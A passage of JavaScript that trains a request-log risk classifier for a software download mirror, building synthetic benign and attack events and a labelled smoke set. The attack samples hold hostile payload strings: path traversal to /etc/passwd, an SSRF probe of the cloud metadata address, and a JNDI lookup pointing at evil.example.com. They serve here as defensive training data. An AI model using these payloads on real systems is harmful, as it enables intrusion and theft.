    return { ev: ev('oss', 'GET', `/${key}`, pick(r, [200, 200, 206, 304]), { 'user-agent': chance(r, 0.5) ? '' : script, referer: chance(r, 0.2) ? ref : '', accept, range, host: pick(r, HOSTS) }), y: 0 };
  }
  const repo = pick(r, REPOS);
  const p = pick(r, [
    `/gh/${pick(r, OWNERS)}/${repo}.git/info/refs?service=git-upload-pack`,
    `/gh/${pick(r, OWNERS)}/${repo}.git/git-upload-pack`,
    `/gh/${pick(r, OWNERS)}/${repo}/archive/refs/heads/${pick(r, BRANCHES)}.zip`,
  ]);
  return { ev: ev('mirror', p.includes('git-upload-pack') ? 'POST' : 'GET', p, 200, { 'user-agent': pick(r, ['git/2.55.0.windows.1', 'git/2.42.0']), referer: '', accept: '*/*', host: pick(r, HOSTS) }), y: 0 };
}

function benignDenied(r) {
  const host = pick(r, HOSTS);
  const kind = pick(r, ['expired', 'missingDevice', 'rateLimit', 'notFound', 'preflight']);
  if (kind === 'expired') {
    const p = `/${pick(r, OWNERS)}/${pick(r, REPOS)}/releases/download/v${randInt(r, 1, 9)}.${randInt(r, 0, 9)}/${pick(r, ASSETS)}`;
    return { ev: ev('download', 'GET', p, 403, { 'user-agent': pick(r, BROWSER_UAS), referer: `https://${pick(r, ['classsoftwarehub.cn', 'www.classsoftwarehub.cn'])}/`, accept: 'application/octet-stream,*/*', host }), y: 0 };
  }
  if (kind === 'missingDevice') {
    return { ev: ev('site', pick(r, ['GET', 'POST']), pick(r, ['/api/files', '/api/oss-sign', '/api/sign']), 401, { 'user-agent': pick(r, [...BROWSER_UAS, ...SCRIPT_UAS]), referer: `https://classsoftwarehub.cn/`, accept: 'application/json', host }), y: 0 };
  }
  if (kind === 'rateLimit') {
    return { ev: ev('site', 'GET', `/gh/${pick(r, OWNERS)}/${pick(r, REPOS)}`, 429, { 'user-agent': pick(r, BROWSER_UAS), referer: '', accept: 'text/html,*/*', host }), y: 0 };
  }
  if (kind === 'notFound') {
    return { ev: ev('download', 'GET', `/${pick(r, OWNERS)}/${pick(r, REPOS)}/releases/download/v9.9.9/${pick(r, ASSETS)}`, 404, { 'user-agent': pick(r, BROWSER_UAS), referer: ref0(r), accept: '*/*', host }), y: 0 };
  }
  return { ev: ev('site', 'OPTIONS', pick(r, ['/api/files', '/api/sign', '/api/status']), 204, { 'user-agent': pick(r, BROWSER_UAS), origin: 'https://classsoftwarehub.cn', accept: '*/*', host }), y: 0 };
}
function ref0(r) { return chance(r, 0.5) ? 'https://classsoftwarehub.cn/' : ''; }

function attackEvent(r) {
  const kind = pick(r, ['probe', 'probe', 'traversal', 'ssrf', 'scanner', 'ossList', 'authBrute', 'hotlink', 'range', 'method', 'jndi']);
  const host = pick(r, HOSTS);
  const weirdUa = pick(r, SCANNER_UAS);
  if (kind === 'probe' || kind === 'scanner') {
    const browser = chance(r, 0.25);
    return { ev: ev('site', pick(r, ['GET', 'GET', 'POST', 'HEAD']), pick(r, PROBE_PATHS), pick(r, [404, 404, 403, 401, 200, 301]), { 'user-agent': browser ? pick(r, BROWSER_UAS) : weirdUa, referer: '', accept: pick(r, ['*/*', 'text/html', '']), host }), y: 1 };
  }
  if (kind === 'traversal') {
    const p = pick(r, ['/gh/../../etc/passwd', '/static/%2e%2e%2f%2e%2e%2fetc%2fpasswd', '/download/%252e%252e%252fetc%252fpasswd', '/assets/..%00/index.js']);
    return { ev: ev('site', 'GET', p, pick(r, [400, 403, 404]), { 'user-agent': pick(r, [...SCRIPT_UAS, ...BROWSER_UAS]), referer: '', accept: '*/*', host }), y: 1 };
  }
  if (kind === 'ssrf') {
    const p = pick(r, ['/api/files', '/api/sign', '/gh/api.github.com/rate_limit', '/proxy']);
    return { ev: ev('site', 'GET', `${p}?${pick(r, ATTACK_QUERIES)}`, pick(r, [400, 401, 403, 200]), { 'user-agent': pick(r, [...SCRIPT_UAS, ...BROWSER_UAS]), referer: '', accept: 'application/json,*/*', host }), y: 1 };
  }
  if (kind === 'ossList') {
    const p = pick(r, ['/api/files?source=bucket&all=1&prefix=../', '/api/files?source=bucket&prefix=/', '/ls?max-keys=1000', '/?list-type=2']);
    return { ev: ev('oss', 'GET', p, pick(r, [401, 403, 200]), { 'user-agent': pick(r, [...SCRIPT_UAS, weirdUa, ...BROWSER_UAS]), referer: '', accept: 'application/json,*/*', host }, { op: chance(r, 0.5) ? 'auth' : '' }), y: 1 };
  }
  if (kind === 'authBrute') {
    return { ev: ev('site', 'POST', pick(r, ['/api/admin/login', '/api/login', '/login', '/api/sign']), 401, { 'user-agent': pick(r, [...SCRIPT_UAS, ...BROWSER_UAS]), referer: '', accept: 'application/json,text/html,*/*', 'content-type': 'application/x-www-form-urlencoded', host }, { op: 'auth' }), y: 1 };
  }
  if (kind === 'hotlink') {
    const p = `/${pick(r, OWNERS)}/${pick(r, REPOS)}/releases/download/v${randInt(r, 1, 9)}.${randInt(r, 0, 9)}/${pick(r, ASSETS)}`;
    return { ev: ev('download', 'GET', p, pick(r, [200, 403]), { 'user-agent': chance(r, 0.5) ? weirdUa : '', referer: `http://${pick(r, ['evil.example.com', 'forum.example.net', '']) }/`, accept: '*/*', host }), y: 1 };
  }
  if (kind === 'range') {
    const p = `/${pick(r, OWNERS)}/${pick(r, REPOS)}/releases/download/v${randInt(r, 1, 9)}.${randInt(r, 0, 9)}/${pick(r, ASSETS)}`;
    const range = pick(r, ['bytes=0-99999999999', 'bytes=0-1023,2048-3071,4096-5119', 'bytes=-999999999', 'bytes=abc-def']);
    return { ev: ev('download', 'GET', p, pick(r, [200, 206, 400, 416]), { 'user-agent': pick(r, [...SCRIPT_UAS, ...BROWSER_UAS]), referer: '', accept: '*/*', range, host }), y: 1 };
  }
  if (kind === 'method') {
    return { ev: ev('site', pick(r, TRACE_METHODS), pick(r, ['/', '/api/status', '/gh']), pick(r, [405, 400, 501, 200]), { 'user-agent': pick(r, [...SCRIPT_UAS, ...BROWSER_UAS]), referer: '', accept: '*/*', host }), y: 1 };
  }
  const p = pick(r, ['/gh/api.github.com/rate_limit', '/api/files', '/']);
  return { ev: ev('site', 'GET', `${p}?x=${encodeURIComponent('${jndi:ldap://evil.example.com/a}')}`, pick(r, [400, 404, 200]), { 'user-agent': pick(r, [...SCRIPT_UAS, weirdUa]), referer: '', accept: '*/*', host }), y: 1 };
}

export function syntheticSamples(total, seed = 20261104) {
  const r = mulberry32(seed);
  const out = [];
  for (let i = 0; i < total; i++) {
    const s = i % 4 === 3 ? benignDenied(r) : (i % 2 === 0 ? legitEvent(r) : attackEvent(r));
    out.push(s);
  }
  return out;
}

function smokeSet() {
  const mk = (service, method, p, status, headers, y, op = '') => ({ ev: ev(service, method, p, status, headers, { op }), y });
  const b = BROWSER_UAS[0];
  const c = 'curl/8.4.0';
  const s = 'sqlmap/1.7';
  return [
    mk('site', 'GET', '/', 200, { 'user-agent': b, referer: '', accept: 'text/html', host: 'classsoftwarehub.cn' }, 0),
    mk('site', 'GET', '/gh/microsoft/vscode', 200, { 'user-agent': b, referer: 'https://classsoftwarehub.cn/', accept: 'text/html', host: 'download.classsoftwarehub.cn' }, 0),
    mk('download', 'GET', '/microsoft/vscode/releases/download/v1.95.0/Setup.exe', 206, { 'user-agent': b, referer: 'https://classsoftwarehub.cn/', accept: '*/*', range: 'bytes=0-1048576', host: 'download.classsoftwarehub.cn' }, 0),
    mk('site', 'GET', '/api/status', 200, { 'user-agent': c, referer: '', accept: 'application/json', host: 'api.classsoftwarehub.cn' }, 0),
    mk('oss', 'GET', '/gh-mirror/0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef', 200, { 'user-agent': '', referer: '', accept: '*/*', host: '209.33.174.187' }, 0),
    mk('site', 'GET', '/api/files', 200, { 'user-agent': 'node-fetch/3.3.2', referer: '', accept: 'application/json', authorization: 'Bearer x', host: 'api.classsoftwarehub.cn' }, 0),
    mk('mirror', 'GET', '/gh/microsoft/vscode.git/info/refs', 200, { 'user-agent': 'git/2.42.0', referer: '', accept: '*/*', host: 'download.classsoftwarehub.cn' }, 0),
    mk('download', 'GET', '/microsoft/vscode/releases/download/v9.9.9/Setup.exe', 404, { 'user-agent': b, referer: 'https://classsoftwarehub.cn/', accept: '*/*', host: 'download.classsoftwarehub.cn' }, 0),
    mk('site', 'GET', '/.env', 404, { 'user-agent': s, referer: '', accept: '*/*', host: 'classsoftwarehub.cn' }, 1),
    mk('site', 'GET', '/wp-admin/', 404, { 'user-agent': b, referer: '', accept: 'text/html', host: 'classsoftwarehub.cn' }, 1),
    mk('site', 'GET', '/gh/../../etc/passwd', 400, { 'user-agent': c, referer: '', accept: '*/*', host: 'download.classsoftwarehub.cn' }, 1),
    mk('site', 'GET', '/api/files', 401, { 'user-agent': 'python-requests/2.31.0 (security scanner)', referer: '', accept: 'application/json', host: 'api.classsoftwarehub.cn' }, 1),
    mk('site', 'POST', '/api/admin/login', 401, { 'user-agent': 'python-requests/2.31.0', referer: '', accept: 'application/json', host: 'api.classsoftwarehub.cn' }, 1),
    mk('download', 'GET', '/microsoft/vscode/releases/download/v1.95.0/Setup.exe', 200, { 'user-agent': s, referer: 'http://evil.example.com/', accept: '*/*', host: 'download.classsoftwarehub.cn' }, 1),
    mk('site', 'TRACE', '/', 405, { 'user-agent': c, referer: '', accept: '*/*', host: 'classsoftwarehub.cn' }, 1),
    mk('site', 'GET', '/api/files?url=http://169.254.169.254/latest/meta-data/', 400, { 'user-agent': b, referer: '', accept: '*/*', host: 'api.classsoftwarehub.cn' }, 1),
  ];
}

// ---------------------------------------------------------------------------
// 数据集构建与并行训练
// ---------------------------------------------------------------------------
function splitReal(samples) {
  const sorted = samples.sort((a, b) => a.ts - b.ts);
  const n = sorted.length;
  const a = Math.floor(n * 0.7);
  const b = Math.floor(n * 0.8);
  const c = Math.floor(n * 0.85);
  return sorted.map((s, i) => ({ ...s, split: i < a ? 0 : i < b ? 1 : i < c ? 2 : 3 }));
}

async function loadReal(inputs) {
  const samples = [];
  const perFile = {};
  for (const input of inputs) {
    for (const file of walkFiles(input)) {
      const hint = serviceHint(file);
      if (!hint) continue;
      let n = 0;
      try {
        for await (const line of linesOf(file)) {
          if (!line.trim().startsWith('{')) continue;
          let raw;
          try { raw = JSON.parse(line); } catch { continue; }
          const e = eventFromLog(raw, hint);
          if (!e || isPrivateIp(e.ip)) continue;
          const y = labelOf(e);
          if (y == null) continue;
          samples.push({ ev: e, y, ts: e.ts, origin: 0 });
          n++;
        }
      } catch (err) {
        console.error(`[warn] 读取失败 ${file}: ${err.message}`);
      }
      if (n) perFile[file] = (perFile[file] || 0) + n;
    }
  }
  return { samples: splitReal(samples), perFile };
}

function buildSynthetic(total, seed) {
  const samples = syntheticSamples(total, seed);
  const out = [];
  for (let i = 0; i < samples.length; i++) {
    const s = samples[i];
    const h = hashToken(`split:${seed}:${i}`) % 100;
    const split = h < 70 ? 0 : h < 80 ? 1 : h < 85 ? 2 : 3;
    out.push({ ev: s.ev, y: s.y, ts: i, origin: 1, split });
  }
  return out;
}

function capByClass(samples, maxPerClass) {
  if (!maxPerClass || samples.length <= maxPerClass * 2) return samples;
  const bySplit = [0, 1, 2, 3].map((sp) => {
    const pos = samples.filter((s) => s.split === sp && s.y === 1);
    const neg = samples.filter((s) => s.split === sp && s.y === 0);
    const keep = Math.floor(maxPerClass / 4);
    const pickN = (arr) => (arr.length <= keep ? arr : arr.filter((_, i) => i % Math.ceil(arr.length / keep) === 0).slice(0, keep));
    return [...pickN(pos), ...pickN(neg)];
  });
  return bySplit.flat();
}

function writeDataset(file, dim, samples, idxToToken) {
  const n = samples.length;
  let nnz = 0;
  for (const s of samples) nnz += s.vec.idx.length;
  const idx = new Uint32Array(nnz);
  const val = new Float32Array(nnz);
  const off = new Uint32Array(n + 1);
  const weight = new Float32Array(n);
  const label = new Uint8Array(n);
  const split = new Uint8Array(n);
  const svc = new Uint8Array(n);
  const origin = new Uint8Array(n);
  const svcIds = { site: 0, download: 1, oss: 2, mirror: 3 };
  let p = 0;
  for (let i = 0; i < n; i++) {
    const s = samples[i];
    off[i] = p;
    for (let j = 0; j < s.vec.idx.length; j++) {
      idx[p] = s.vec.idx[j];
      val[p] = s.vec.val[j];
      p++;
    }
    weight[i] = s.weight;
    label[i] = s.y;
    split[i] = s.split;
    svc[i] = svcIds[s.ev.service] ?? 0;
    origin[i] = s.origin;
  }
  off[n] = p;
  const header = Buffer.alloc(56);
  header.write('RMDATA02', 0, 'latin1');
  header.writeUInt32LE(dim, 8);
  header.writeUInt32LE(n, 12);
  header.writeUInt32LE(nnz, 16);
  let pos = 56;
  const add = (arr) => {
    const b = Buffer.from(arr.buffer, arr.byteOffset, arr.byteLength);
    const at = pos;
    pos += b.length;
    return { b, at };
  };
  const sec = [add(idx), add(val), add(off), add(weight), add(label), add(split), add(svc), add(origin)];
  sec.forEach((s, i) => header.writeUInt32LE(s.at, 20 + i * 4));
  fs.writeFileSync(file, Buffer.concat([header, ...sec.map((s) => s.b)]));
  return { n, nnz };
}

class Pool {
  constructor(file, size, log) {
    this.file = file;
    this.size = size;
    this.log = log;
    this.slots = [];
    this.jobs = [];
    this.results = new Map();
    this.jobErrors = [];
    this.startErrors = [];
    this.startResolve = null;
    this.startReject = null;
    this.pending = null;
    this.finish = null;
    this.next = 0;
  }
  start() {
    return new Promise((resolve, reject) => {
      this.startResolve = resolve;
      this.startReject = reject;
      for (let i = 0; i < this.size; i++) {
        const w = new Worker(new URL('./risk-train-worker.mjs', import.meta.url), { workerData: { file: this.file } });
        const slot = { w, ready: false, dead: false, closing: false, job: null };
        this.slots.push(slot);
        w.on('message', (m) => this.onMessage(slot, m));
        w.on('error', (e) => this.onWorkerError(slot, e));
        w.on('exit', (code) => { if (code !== 0) this.onWorkerError(slot, new Error(`worker 退出 ${code}`)); });
      }
    });
  }
  checkStart() {
    if (!this.startResolve) return;
    if (this.slots.some((s) => !s.ready && !s.dead)) return;
    const alive = this.slots.filter((s) => s.ready).length;
    const resolve = this.startResolve;
    const reject = this.startReject;
    this.startResolve = this.startReject = null;
    if (alive) resolve(alive);
    else reject(new Error(`所有 worker 初始化失败: ${this.startErrors[0] || ''}`));
  }
  run(jobs) {
    this.jobs = jobs;
    this.results = new Map();
    this.jobErrors = [];
    this.next = 0;
    if (!jobs.length) return Promise.resolve({ results: [], errors: [] });
    return new Promise((resolve) => {
      this.pending = jobs.length;
      this.finish = resolve;
      for (const s of this.slots) if (s.ready) this.assign(s);
    });
  }
  assign(slot) {
    if (this.pending == null || slot.dead || slot.job != null) return;
    if (this.next >= this.jobs.length) return;
    const job = this.jobs[this.next++];
    slot.job = job.id;
    slot.w.postMessage({ type: 'run', jobId: job.id, config: job.config });
  }
  maybeFinish() {
    if (this.pending == null) return;
    if (this.results.size + this.jobErrors.length < this.pending) return;
    const finish = this.finish;
    this.pending = null;
    this.finish = null;
    finish({ results: [...this.results.values()], errors: this.jobErrors });
  }
  onMessage(slot, m) {
    if (!m) return;
    if (m.type === 'ready') {
      if (slot.ready || slot.dead) return;
      slot.ready = true;
      this.checkStart();
      if (this.pending != null) {
        this.assign(slot);
        this.maybeFinish();
      }
      return;
    }
    if (m.type === 'fatal') {
      this.startErrors.push(String(m.error || 'fatal'));
      this.killSlot(slot);
      this.checkStart();
      this.maybeFinish();
      return;
    }
    if (m.type === 'result') {
      this.results.set(m.jobId, m);
      slot.job = null;
      this.log?.(`  job#${m.jobId} done ap=${m.eval?.ap?.toFixed(4)} f1=${m.eval?.f1?.toFixed(4)} p=${m.eval?.precision?.toFixed(3)}`);
      this.assign(slot);
      this.maybeFinish();
    } else if (m.type === 'error') {
      this.jobErrors.push(`job#${m.jobId}: ${m.error}`);
      slot.job = null;
      this.assign(slot);
      this.maybeFinish();
    }
  }
  onWorkerError(slot, e) {
    if (slot.closing || slot.dead) return;
    const msg = String(e?.message || e);
    this.log?.(`  worker error: ${msg}`);
    this.startErrors.push(msg);
    if (slot.job != null) this.jobErrors.push(`job#${slot.job}: worker error: ${msg}`);
    this.killSlot(slot);
    this.checkStart();
    this.maybeFinish();
  }
  killSlot(slot) {
    if (slot.dead) return;
    slot.dead = true;
    slot.job = null;
    try { slot.w.terminate(); } catch {}
  }
  close() {
    for (const s of this.slots) {
      s.closing = true;
      try { s.w.terminate(); } catch {}
    }
  }
}

function mergeWeights(runs, dim) {
  const acc = new Float32Array(dim);
  let bias = 0;
  for (const r of runs) {
    bias += r.bias;
    for (let i = 0; i < r.indices.length; i++) acc[r.indices[i]] += r.values[i];
  }
  const k = runs.length || 1;
  const idx = [];
  const val = [];
  for (let i = 0; i < dim; i++) {
    const w = acc[i] / k;
    if (Math.abs(w) >= 1e-5) { idx.push(i); val.push(w); }
  }
  return { bias: bias / k, indices: Uint32Array.from(idx), values: Float32Array.from(val) };
}

function scoreSample(model, vec) {
  let z = model.bias;
  for (let i = 0; i < vec.idx.length; i++) z += model.weights[vec.idx[i]] * vec.val[i];
  return sigmoid(z);
}

function evaluate(model, samples, split, originFilter, threshold) {
  const scores = [];
  const labels = [];
  const byService = {};
  for (const s of samples) {
    if (s.split !== split) continue;
    if (originFilter != null && s.origin !== originFilter) continue;
    const sc = scoreSample(model, s.vec);
    scores.push(sc);
    labels.push(s.y);
    const svc = s.ev.service;
    byService[svc] = byService[svc] || { scores: [], labels: [] };
    byService[svc].scores.push(sc);
    byService[svc].labels.push(s.y);
  }
  const out = summarize(scores, labels, threshold);
  out.byService = Object.fromEntries(Object.entries(byService).map(([k, v]) => [k, summarize(v.scores, v.labels, threshold)]));
  return out;
}

function toFeatureMap(model, idxToToken) {
  const rows = [];
  for (let i = 0; i < model.weights.length; i++) {
    if (!model.weights[i]) continue;
    rows.push({ index: i, weight: Math.round(model.weights[i] * 1e4) / 1e4, token: idxToToken.get(i)?.t || '' });
  }
  rows.sort((a, b) => Math.abs(b.weight) - Math.abs(a.weight));
  return rows.slice(0, 24);
}

export async function train({
  inputs,
  dim = DEFAULT_DIM,
  search = 48,
  bags = 8,
  synthetic = 120000,
  workers = os.availableParallelism ? os.availableParallelism() : os.cpus().length,
  realWeight = 2.5,
  maxPerClass = 300000,
  seed = 42,
  quick = false,
  log = console.log,
} = {}) {
  const started = Date.now();
  if (quick) {
    search = Math.min(search, 8);
    bags = Math.min(bags, 2);
    synthetic = Math.min(synthetic, 20000);
    workers = Math.min(workers, 2);
  }
  const real = inputs && inputs.length ? await loadReal(inputs) : { samples: [], perFile: {} };
  const synth = synthetic > 0 ? buildSynthetic(synthetic, seed ^ 0x9e3779b9) : [];
  let samples = [...real.samples, ...synth];
  samples = capByClass(samples, maxPerClass);
  if (!samples.length) throw new Error('没有可用样本');
  log(`样本: 真实 ${real.samples.length} + 合成 ${synth.length} = ${samples.length}`);

  const idxToToken = new Map();
  for (let i = 0; i < samples.length; i++) {
    const s = samples[i];
    const tokens = riskMlTokens(s.ev);
    for (const t of tokens) {
      const idx = tokenIndex(t, dim);
      const cur = idxToToken.get(idx);
      if (cur) cur.n++;
      else idxToToken.set(idx, { t, n: 1 });
    }
    s.vec = vectorizeSparse(tokens, dim);
    s.weight = s.origin === 0 ? realWeight : 1;
  }
  const tmp = path.join(os.tmpdir(), `risk-dataset-${process.pid}-${Date.now()}.bin`);
  const meta = writeDataset(tmp, dim, samples, idxToToken);
  log(`数据集: n=${meta.n} nnz=${meta.nnz} dim=${dim} 文件=${(fs.statSync(tmp).size / 1024 / 1024).toFixed(1)}MB`);

  const rng = mulberry32(seed);
  const lrs = [0.04, 0.06, 0.09, 0.13, 0.18, 0.25, 0.35, 0.5];
  const l2s = [5e-7, 2e-6, 8e-6, 3e-5, 1e-4, 3e-4];
  const epochs = [8, 12, 16, 20, 26, 34];
  const boosts = [1, 1.25, 1.6, 2.2];
  const seen = new Set();
  const candidates = [];
  while (candidates.length < search) {
    const cfg = {
      lr: pick(rng, lrs), l2: pick(rng, l2s), epochs: pick(rng, epochs), posBoost: pick(rng, boosts),
      subsample: 1, splits: [0], evalSplit: 1, minPrecision: 0.9, seed: (seed * 1000 + candidates.length) >>> 0,
    };
    const key = `${cfg.lr}|${cfg.l2}|${cfg.epochs}|${cfg.posBoost}`;
    if (seen.has(key)) continue;
    seen.add(key);
    candidates.push(cfg);
  }
  log(`超参搜索: ${candidates.length} 组，worker=${workers}`);
  const pool = new Pool(tmp, workers, log);
  let jobs, searchOut, ranked, bestJob, bestIdx, bestCfg, bagOut;
  try {
    await pool.start();
    jobs = candidates.map((cfg, i) => ({ id: i, config: cfg }));
    searchOut = await pool.run(jobs);
    if (searchOut.errors.length) log(`搜索告警: ${searchOut.errors.slice(0, 3).join('; ')}`);
    ranked = searchOut.results
      .filter((r) => r.eval && r.eval.ap > 0)
      .sort((a, b) => b.eval.ap - a.eval.ap || b.eval.f1 - a.eval.f1);
    if (!ranked.length) throw new Error('超参搜索没有产出有效模型');
    bestJob = ranked[0];
    bestIdx = jobs.findIndex((j) => j.id === bestJob.jobId);
    bestCfg = candidates[bestIdx];
    log(`最优超参: lr=${bestCfg.lr} l2=${bestCfg.l2} epochs=${bestCfg.epochs} boost=${bestCfg.posBoost} valAP=${bestJob.eval.ap.toFixed(4)} valF1=${bestJob.eval.f1.toFixed(4)}`);

    log(`bagging: ${bags} 个模型（train+valConfig）`);
    const bagJobs = Array.from({ length: bags }, (_, i) => ({
      id: 1000 + i,
      config: { ...bestCfg, splits: [0, 1], subsample: 0.9, evalSplit: 2, seed: (bestCfg.seed + 7919 * (i + 1)) >>> 0 },
    }));
    bagOut = await pool.run(bagJobs);
    if (bagOut.errors.length) log(`bagging 告警: ${bagOut.errors.slice(0, 3).join('; ')}`);
    if (!bagOut.results.length) throw new Error('bagging 没有产出模型');
  } finally {
    pool.close();
  }
  const merged = mergeWeights(bagOut.results, dim);
  const model = { bias: merged.bias, weights: new Float32Array(dim) };
  for (let i = 0; i < merged.indices.length; i++) model.weights[merged.indices[i]] = merged.values[i];

  const valScores = [];
  const valLabels = [];
  for (const s of samples) {
    if (s.split !== 2) continue;
    valScores.push(scoreSample(model, s.vec));
    valLabels.push(s.y);
  }
  const base = bestThreshold(valScores, valLabels, 0.9);
  const high = highThreshold(valScores, valLabels, base.threshold, Math.max(20, Math.floor(valLabels.filter((y) => y === 1).length * 0.01)));
  const highT = Math.min(0.99, Math.max(high.threshold, Math.round((base.threshold + 0.05) * 1000) / 1000));
  log(`阈值: base=${base.threshold} (val P=${base.precision.toFixed(3)} R=${base.recall.toFixed(3)}) high=${highT} (val P=${high.precision.toFixed(3)} R=${high.recall.toFixed(3)})`);

  const valMetrics = summarize(valScores, valLabels, base.threshold);
  const test = evaluate(model, samples, 3, null, base.threshold);
  const realTest = evaluate(model, samples, 3, 0, base.threshold);
  const synthTest = evaluate(model, samples, 3, 1, base.threshold);
  const testHigh = evaluate(model, samples, 3, null, highT);

  const smoke = smokeSet();
  let hit = 0;
  const misses = [];
  for (const s of smoke) {
    const sc = scoreSample(model, vectorizeSparse(riskMlTokens(s.ev), dim));
    const pred = sc >= base.threshold ? 1 : 0;
    if (pred === s.y) hit++;
    else misses.push({ want: s.y, got: pred, score: Math.round(sc * 1e4) / 1e4, path: s.ev.path, ua: String(s.ev.headers['user-agent'] || '').slice(0, 24) });
  }
  log(`冒烟集: ${hit}/${smoke.length}` + (misses.length ? ` 误判=${JSON.stringify(misses.slice(0, 5))}` : ''));

  const sparse = [];
  for (let i = 0; i < dim; i++) if (Math.abs(model.weights[i]) >= 1e-4) sparse.push([i, Math.round(model.weights[i] * 1e6) / 1e6]);
  const counts = (sp) => {
    const arr = samples.filter((s) => s.split === sp);
    return { n: arr.length, pos: arr.filter((s) => s.y === 1).length, real: arr.filter((s) => s.origin === 0).length, synthetic: arr.filter((s) => s.origin === 1).length };
  };
  const out = {
    v: 1,
    feature: FEATURE_VERSION,
    dim,
    bias: Math.round(model.bias * 1e6) / 1e6,
    threshold: Math.round(base.threshold * 1000) / 1000,
    high: Math.round(highT * 1000) / 1000,
    weights: sparse,
    createdAt: new Date().toISOString(),
    samples: {
      total: samples.length, ...counts(0), valConfig: counts(1), valThreshold: counts(2), test: counts(3),
      real: samples.filter((s) => s.origin === 0).length, synthetic: samples.filter((s) => s.origin === 1).length,
    },
    metrics: {
      valThreshold: valMetrics,
      test,
      realTest,
      synthTest,
      testAtHigh: testHigh,
      high: { threshold: highT, ...metricsAt(valScores, valLabels, highT) },
      smoke: { total: smoke.length, hit, accuracy: hit / smoke.length, misses },
      search: {
        candidates: candidates.length,
        bags: bagOut.results.length,
        workers,
        best: { lr: bestCfg.lr, l2: bestCfg.l2, epochs: bestCfg.epochs, posBoost: bestCfg.posBoost },
        bestVal: bestJob.eval,
        seconds: Math.round((Date.now() - started) / 100) / 10,
      },
    },
    topFeatures: toFeatureMap(model, idxToToken),
  };
  try { fs.rmSync(tmp, { force: true }); } catch {}
  return { model: out, perFile: real.perFile };
}

async function main() {
  const args = process.argv.slice(2);
  const opt = {
    dim: DEFAULT_DIM, search: 48, bags: 8, synthetic: 120000, workers: os.availableParallelism ? os.availableParallelism() : os.cpus().length,
    realWeight: 2.5, maxPerClass: 300000, seed: 42, quick: false, inputs: [], out: 'risk-model.json',
  };
  for (let i = 0; i < args.length; i++) {
    const a = args[i];
    if (a === '--input') opt.inputs.push(args[++i]);
    else if (a === '--out') opt.out = args[++i];
    else if (a === '--dim') opt.dim = Number(args[++i]);
    else if (a === '--search') opt.search = Number(args[++i]);
    else if (a === '--bags') opt.bags = Number(args[++i]);
    else if (a === '--synthetic') opt.synthetic = Number(args[++i]);
    else if (a === '--workers') opt.workers = Number(args[++i]);
    else if (a === '--real-weight') opt.realWeight = Number(args[++i]);
    else if (a === '--max-per-class') opt.maxPerClass = Number(args[++i]);
    else if (a === '--seed') opt.seed = Number(args[++i]);
    else if (a === '--quick') opt.quick = true;
  }
  if (!opt.inputs.length) {
    const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '../../log-dump-20261030');
    opt.inputs = [
      path.join(root, 'jp/var/log/gh-stream/downloads.jsonl'),
      path.join(root, 'jp/var/log/gh-web-proxy/requests.jsonl'),
      path.join(root, 'jp/var/log/gh-web-proxy/requests-8083.jsonl'),
      path.join(root, 'ecs/var/log/oss-relay/downloads.jsonl'),
      path.join(root, 'ecs/var/log/gh-mirror/downloads.jsonl'),
    ].filter((p) => fs.existsSync(p));
  }
  if (opt.inputs.length) console.log(`训练输入: ${opt.inputs.join(', ')}`);
  else console.log('未找到历史日志，仅使用合成语料训练');
  if (!Number.isInteger(opt.dim) || opt.dim < 64 || opt.dim > 4096) { console.error('dim 必须在 64..4096'); process.exit(1); }
  const { model, perFile } = await train(opt);
  fs.writeFileSync(opt.out, JSON.stringify(model));
  console.log(`输出: ${opt.out} (${(fs.statSync(opt.out).size / 1024).toFixed(1)}KB, ${model.weights.length} 个非零权重)`);
  console.log('样本:', model.samples);
  console.log('测试(合成+真实):', model.metrics.test);
  console.log('测试(仅真实):', model.metrics.realTest);
  console.log('测试(仅合成):', model.metrics.synthTest);
  console.log('高置信@测试:', model.metrics.testAtHigh);
  console.log('耗时:', model.metrics.search.seconds, 's');
  for (const [f, n] of Object.entries(perFile)) console.log(`  ${n}  ${f}`);
}

if (process.argv[1] && path.resolve(process.argv[1]) === fileURLToPath(import.meta.url)) {
  main().catch((e) => { console.error(e); process.exit(1); });
}
